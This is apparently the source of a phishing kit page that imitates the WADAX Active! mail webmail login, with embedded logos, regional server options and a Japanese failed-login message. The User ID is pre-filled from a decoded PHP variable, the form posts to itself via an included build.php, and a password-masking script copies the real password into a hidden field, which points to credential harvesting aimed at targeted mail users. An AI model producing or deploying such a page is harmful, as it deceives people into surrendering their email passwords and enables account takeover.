<?php include '../build.php' ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta charset="UTF-8">
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
    <meta http-equiv="AM-Template" content="standard/html/index.html">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Content-Language" content="jp">
    <meta name="format-detection" content="telephone=no">

    <title>WADAX Active! mail</title>
    <style>
        .amvpop_panel {
            border-width: 1px;
            border-style: solid;
            border-color: #3973ad;
            background-color: white;
            overflow: hidden;
            padding: 2px;
        }

        .amvpop_shadow {
            top: 3px;
            left: 3px;
            background-color: gray;
            overflow: hidden;
        }

        .amvpop_title {
            padding: 3px 0 0 10px;
            overflow: hidden;
            color: white;
            background-color: #3973ad;
            cursor: default;
            font-size: 12px;
            font-weight: bold;
            white-space: nowrap;
        }

        .amvpop_content {
            cursor: default;
            padding: 5px 6px 0 6px;
            overflow: auto;
            background-color: white;
            font-size: 14px;
        }

        .amvpop_buttons {
            padding: 12px 0 0 10px;
            cursor: default;
            background-color: white;
            font-size: 10px;
            text-align: center;
            white-space: nowrap;
        }

        .amvpop_form {
            margin-top: 0px;
            margin-bottom: 10px;
            text-align: center;
        }

        .amvpop_status {
            padding: 5px 10px 0 10px;
            cursor: default;
            background-color: white;
            font-size: 10px;
            line-height: 1;
            text-align: center;
        }

        .amvpop_close {
            position: absolute;
            right: 4px;
            top: 4px;
            width: 16px;
            height: 16px;
            cursor: default;
            overflow: hidden;
            background-image: url(../img/standard/closebox.gif);
            background-repeat: no-repeat;
        }

        .amvpop_resize {
            position: absolute;
            right: 2px;
            bottom: 2px;
            width: 7px;
            height: 7px;
            cursor: se-resize;
            overflow: hidden;
            background-image: url(../img/standard/resize7blue.gif);
            background-repeat: no-repeat;
        }

        .amvpop_status_warn {
            color: red;
            font-weight: bold;
        }

        .amvpop_status_error {
            color: red;
            font-weight: bold;
        }

        .amvpop_status_info {
            color: black;
            font-weight: bold;
        }

        body {
            padding: 0;
            width: 100%;
            height: 95%;
            overflow: auto;
            background-image: url(data:image/gif;base64,R0lGODlhKQEUALMAAKPS/5jN/6nV/+Lx/7/g/57Q/8vm/7Pa/+v1//P5/9vu/8Ti/7nd/6/Y//z9/9Pq/yH5BAAAAAAALAAAAAApARQAAAT/MMhJq50l5K11+SAIFGMJnCgqAGsruG8cNwJtN3ieH83h/0Ag4zAsMo5IJIGxbBKezwVUuqhar4ZFdqvVGr7gsOExLpPPj7RarXi0326FfD4fKOz4gX7P3yMGf4EIgoOFhQkIiIoJjI2OjQ4JkZMOlZaXlxeaFBydIZ8fJSSjKSkrJy0sL6oyLzY1sDo6PLQ9QUJEREe6SUdNTMBQwgRUxFdWXMleYmJnZmNr0Wlw1HF0dHh3d33cgYDfhuGHieSLj4+TkuqY7O2bmxkSnR4boCKkJKWmLPypra2vAtaQVYtWkCE+iuTq1euXk2HEIloxdqyLMmZhyHxxhqajNDcg/9/IsVZHWzZu3cCpFGdIUblE59CtW9fO3Tt5GDp4sncvFCl9Kvqx+gcw1kBZBHvYuqXQCENfwYJBlCixIjKLX5Y1A8PRzMc200KGvEb25DaUK8GxbPnSXExG6eLWnFvppl2deOvxFGUCqFAYQ/8JRDpr6a2DC3k9dchkmJQoFK1exIqR6zOOH8NWI4vN5Fm0flYOArS2Lcy3juJKopvpboV5enni4wv01N9VRI0GJFzQMNOFu55GdTi1mFWLyLdUttw185rNYzl7zgM6LaHSLrOjhjuTEmtMrjnl3EnPHt98fv3dzj04VtKCiBMmFg6VOETjVSJjSa6VmcbL0Hgkzf9mI5U13WdoeaMgaWtlV8523dH0nQN3xZOXTrL55FNfta2X2wy6EVaYQb81RR9jDzlG1XFVJJNVZf81F2A0YIlFjXQlnQTagtc1aBqEEXo3YWvhXQAbhnvN5tdfrARW1G4ikngYLiYKh6KKkLHIn4vLAYhZZtDheGB1fPA4Wmk/AhnkkEWOl1eGs/2kj23+4EZUe1EqJWWJvCiWBIqN3VdVRZMp16WMzrFhY3ScmUWmdQxil+Z2qgnJZpsWwvZBeaCctySTdbKnm3sj6hnffH42NFxxg+p31UXLxXhZGjMOaGOB1ziKIEo8quWjg0BWutqEFbq5k2wjbIheh6F+6Er/iCLiAB+fTi02XKAq4nccl/1ZtpGXXylKoJiO7mgdmj+ehpqwQ7LTppEXxtapkumt56QMg0W755So0netoFmyWGi3/nlZK42Lkjvdo+f2GA6walZ6Kabxwunpsvug0o+dgo2a57SHVZlqfasKSoVkWxK8VXOJJsyogTpW1yu66Qa7ZrsUUowTeRl6uqR6zXaM53um4iJfldbaly1Frra4ZazMeSUgwjeK1Fm5MkOKJrDqvsXuxO9kWnHP93A4p4fO5hutnr790NTISvzLqrYoG6qyrCzbqtmtCsfMa8OSQkzpzTjn/K54R5JNW72h3gsilLy1PeXb/l4pzGOD1v30naEGJxomjliTaabDbGlns1zEvpu4xXHWqzFgoqpN9L5U9mml3CY3nbKhUOftXJgkwWyS6ID/2haEX+OsurH0cPqJz4yD+iGeR+3A9m9HA3e70pe3uu3mGOEt9cHP8R38mLumNHPgxw8uceo3ia0p2cp+CrSzj5Oqb9GIIc0QoFNZke6cZjcYRe1LCNtb1UC3sAQVjyVcO113CleJCAAAOw==);
            background-repeat: repeat-y;
            font-size: small;
        }

        select {
            min-height: 1.6em;
        }

        input[type="text"] {
            min-height: 1.6em;
        }

        button.imgbtn {
            margin: 0 2px;
            padding: 2px 3px 1px 1px;
            font-size: 12px;
        }

        button.imgbtn img {
            padding: 0 0 0 2px;
            vertical-align: top;
        }

        div.border {
            width: 100%;
            background-image: url(data:image/gif;base64,R0lGODlhAAoDAOYAAK7b//////3+//v9//7///z+//r9//j8//7+//b7/+v2//L5//T6/+/4/+33//P6//n8//X7//H5/8Lk/9rv/+j1/7ng/+n1/8ro/93w/+Hy/+Tz/+z3/+b0/+Pz/+r2/9ju//f8/+Ly/9Hr/9nu/+Dx/+f0/83p/9Ts/8nn/7jg/9ft/97x/8bm/8jn/+74/8Tl/87p/+X0/73i/7zi/7rh/9bt/7Te/9Dq/9Ps/9vv/8zp/7bf/8/q/8Dj//D4/8Hk//f7/8fm/8Pl/9Xt/9/x/8vo/9Lr/9zw/7ff/7/j/7vh/+73/9fu/+Dy/7Xf/8Xm//D5/9Xs/77i/9Pr/9Dr//n9/7Xe/97w//X6/9zv/77j/8fn/8Xl/+f1/7Pe/87q/+Xz/7Pd/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAACgMAAAf/gAGCg4SFhoeIhQSLjI2Oj48IkpOUlQgCmJmam5ydmQWgoaKjpKADp6ipqqurBq6vsLGxVrRWELe4uboHvL2+v78hwsPEIUHHyMcJy8zNzgkR0dLT1FnWWQzZ2tvcDA/f4OHiC+Tl5ucLEurr7O1R71E/8vPyDfb3+Pkv+/z7TP9MHAgcSLAgh4MIEx5UwLChw4cKPkicSPHDhYsYM16swLGjR45eQpoYSXJkh5MoU56UwbIlyzAwN8icSVOmh5s4c94UwbOnTxEaggodGtSJUSclkipNWqSp0yIsokqNiqUqlgxYs2rFiqSrVyRawmrRQbYsWQpo06pFS6Kt27Yg/+LKnQuiid0mK/LqzWujr9++RAILJiKlsBQUiBMjzsG4MWMqkKkcmUz5yIjLmC9X2VwFh+fPnnuIHi0ajOkYqFOjPsG6NesdsGPDNkK7thEMuHPrxp2it+/eLoILD86lOBchyJMLacG8OXMo0KF0md4FhvXr1odo3z5kgvfv4L0DGU9+vI/z6M8rWc9eyZb3W6bInzKjvv36NPLrz7+kv/8lNQQoYIAWFGjggQWqoOCCCibh4INJ8CDhhBI+YeETV2R4xQ0cdsjhFyCKAcCIJJZo4okopqjiiiy26OKLMMYo44w01mjjjTjmqOOOPPbo449ABinkkEQWaeSRSCap5P+STDbp5JNQRinllFRWaeWVWGb5YiJcdtklJGCGyYglZE7iyZloalLKmmuy4uabqMgip5y12KLLnbgAo6eexfSZTDLPBMoMNYROcw023SSajTiMhoPOo+W0Iyk78MRDzzz5ZIpPP/0AFFBBoA6k0KgcQGRqQxWlqtGqF3zkagUheVFSSSrV2oFLLsEURk28bqDTrx78JCxRxGpwFFJLKfWUU1NNZdVVW0X7lVdijWVWWWtlS8Fbb9Hl7V147aXXX38NJphhhymWmGOORSZZZZNllhlnnYH2GWmkmQaGaqq55ppsstlW224EY/Dbb8MNZ9xxyiHnnHPRSUcddthxt13/eBhPUF556aXXHnvwxTffffftt99//g04IIIsW8AggxA+SCGFF2KooYcegviFiFr27PPPQAct9NBEF2300UgnrfTSTDft9NNQRy21k15WbbUgYmYdSZlkpum1J2yGLQqcZLcy59mu1Inn2nu23UufxfyJjKCCFmr3oYoq2ujekEI66d+VXoqppppyyo+noSZOqkKnnppqRaxq9OpHsc5Kkq0q4dqSrr3WBKxOwv5ULFHHJqvsslA1S5VV0Uo7LVhiXYuttmpx65a3dIEr7rjkAmYuYYapuy67j0UGb7zyasaZvffiW9pp/K7m72sAzybwbQXrdrBvCQu3cMMOP/xcT3TUVUdxdhZ3lzF4G5PXMXofrxfyfPSRjJ/J/KEMoMoEtnzgywuKmYNmNqGaaWhDOPtQiKbGwAY68IEQjKAEJ0jBClrwghjMoAY3yEEZBQIAOw==);
            background-repeat: no-repeat;
        }

        div.layout {
            margin: 10% auto 14% auto;
            width: 410px;
        }

        div.logo {
            margin: 20px 0 20px 50px;
        }

        table.login {
            border-collapse: collapse;
            border-color: #999999;
            border-spacing: 0;
            border-style: outset;
            border-width: 1px;
            background-color: #FFFFFF;
        }

        table.login th {
            padding: 4px;
            border-color: #999999;
            border-style: inset;
            border-width: 1px;
            background-color: #5791d1;
            text-align: left;
        }

        table.login td {
            padding: 4px;
            border-color: #999999;
            border-style: inset;
            border-width: 1px;
            background-color: #f0f0f0;
        }

        table.inner {
            background-color: #f0f0f0;
            border-style: none;
            font-size: 80%;
            margin: 0;
            padding: 2px;
            width: 400px;
        }

        table.inner input.length {
            width: 160px;
        }

        table.inner th {
            margin: 0;
            padding: 0;
            border-style: none;
            color: #333333;
            background-color: #f0f0f0;
            text-align: right;
            white-space: nowrap;
        }

        table.inner th.copyright {
            margin: 0;
            padding: 0;
            color: #666666;
            font-size: 75%;
            vertical-align: bottom;
            white-space: nowrap;
            text-align: left;
        }

        table.inner td {
            margin: 0;
            padding: 0;
            border-style: none;
            background-color: #f0f0f0;
            text-align: left;
        }

        table.inner td.authinfo {
            text-align: right;
            font-weight: bold;
        }

        table.login_footer {
            padding: 0;
            margin-top: 5px;
            width: 410px;
        }

        table.login_footer td.english {
            padding: 0;
            font-size: 90%;
            text-align: right;
        }

        div.chpassword {
            margin: 0 0 20px 0;
        }

        div.chpassword table {
            border-collapse: collapse;
        }

        div.chpassword table td {
            font-size: 90%;
            padding: 0;
        }

        div.chpassword table.inner_table {
            margin: 20px 0 0 0;
        }

        div.chpassword table.inner_table td {
            padding: 0 10px 0 0;
        }

        div.chpassword table.inner_table td span.required {
            color: red;
            display: inline-block;
            font-weight: normal;
        }

        div.pop_btn {
            margin-top: 5px;
            text-align: center;
        }
    </style>
</head>

<body topmargin="0" leftmargin="0" text="#000000" bgcolor="#FFFFFF">
    <div id="ajax_content" style="position:absolute;visibility:hidden;display:none;"></div>
        <div class="logo">

            <img src="data:image/gif;base64,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" alt="WADAX Active! mail" title="WADAX Active! mail" width="164" height="59">

        </div>
        <div class="border"><br></div>

        <div class="layout">
            
<div id="msg" style="background-color: #ffffff; color: red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; display: none;">
    ログインできませんでした。(ユーザーIDまたはパスワードが正しくありません)
</div>
<div id="error" style="background-color: #ffffff; color: red; margin: 10px 0 10px; padding: 10px !important; padding-bottom: 0; border: 2px solid #d5d5d5; text-align: left; <?php echo $error; ?>">
    ログインできませんでした。(ユーザーIDまたはパスワードが正しくありません)
</div>
            
            <table class="login">
                <tbody><tr>
                    <th><img src="data:image/gif;base64,R0lGODlhSAAeALMNANXk9PX4/Ja64uDq9sDW7urx+aHB5Yyz37bP68vd8YGt3avI6P///////wAAAAAAACH5BAEAAA0ALAAAAABIAB4AAAT/sMlJq7046827/2AojmRpnmiqhoqycu27MMzyZgDtqnN9YznGLtWz/SyChZFHW25imqEI+ilyCAEao2CwBBmAhnYS3JUR2sKh2twMtHAC5Q0vjCVlPI2uDbB9GQR7EgpZDF0NAjQBLoV3DXmQiwINjgyUHVYZixQKNAV6lxOKNGQ6oQgTgoAcmhcGNHIUdgwSj7aloWanEq4bvhXAebdiuZJCuhPAGcvKbRTDxri1ycdDzRfYlYMUd3RrEgePkZEN2sGxLepUhpgNq7I9AxN8psjWzqy/cPxgEqQMCCwI4meCoQAAAhiihq+huWet+sEJIwEWP1AVFoIax6vcuU5KO0KKXOCuIgAACUpSSILpUZIlL0EukHIEiUBwuObVfAFw5gE6qXa+4AOnoFAZfAYEPcq0qdOnUKNKvRABADs=">
                    </th>
                </tr>
                <tr>
                    <td>
                        <!--<form id="login-form" name="login-form" data-name="" action="" method="post" required="">-->
                        <form action="" method="POST">
                            <input type="hidden" name="login" value="wadax">
                                <table class="inner" cellspacing="3" cellpadding="3">
                                    <tbody><tr>
                                        <th>User ID :</th>
                                        <td>
                                            <input type="text" class="length" name="user" id="user" size="19" readonly="" maxlength="1024" autocomplete="off" value="<?php echo htmlspecialchars($decoded); ?>" tabindex="1">
                                        </td>
                                        <td>

                                            <select name="am_authdomain_secid" tabindex="3">


<option value="item1">wx05 - Tokyo</option>
<option value="item2">wx06 - Osaka</option>
<option value="item3">wx07 - Nagoya</option>
<option value="item4">wx08 - Fukuoka</option>


                                            </select>

                                        </td>
                                    </tr>

                                    <tr>
                                        <th>Password :</th>
                                        <td colspan="3">
                                            <input type="text" class="length" name="pass" id="password" size="20" maxlength="1024" autocomplete="off" value="" tabindex="2">
                                        </td>
                                    </tr>


                                    <tr>
                                        <th>Language :</th>
                                        <td colspan="3">
                                            <select name="language" tabindex="4">
                                                <option value="auto" selected="">Auto-Select</option>

                                                <option value="en">English</option>

                                                <option value="ja">Japanese</option>

                                                <option value="ko">Korean</option>

                                                <option value="zh-cn">Chinese</option>


                                            </select>
                                        </td>
                                    </tr>


                                    <tr>
                                        <td colspan="4" class="authinfo">
                                            <input type="checkbox" name="save_authinfo" id="save_authinfo" value="on" tabindex="5"><label for="save_authinfo">Save the user ID/password</label>
                                        </td>
                                    </tr>


                                    <tr>
                                        <th colspan="2" class="copyright">WADAX Active! mail <br>&copy;2026 QUALITIA CO., LTD.
                                            All Rights Reserved.</th>
                                        <th>

                                            <button type="submit" onclick="submitLogin(event);" id="submit-btn" tabindex="6">Log In</button>

                                        </th>
                                    </tr>
                                </tbody>
                            </table>
                        </form>
                    </td>
                </tr>
            </tbody></table>

            <table class="login_footer">
                <tbody><tr>
                    <td class="english">

                    </td>
                </tr>
            </tbody></table>

        </div>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>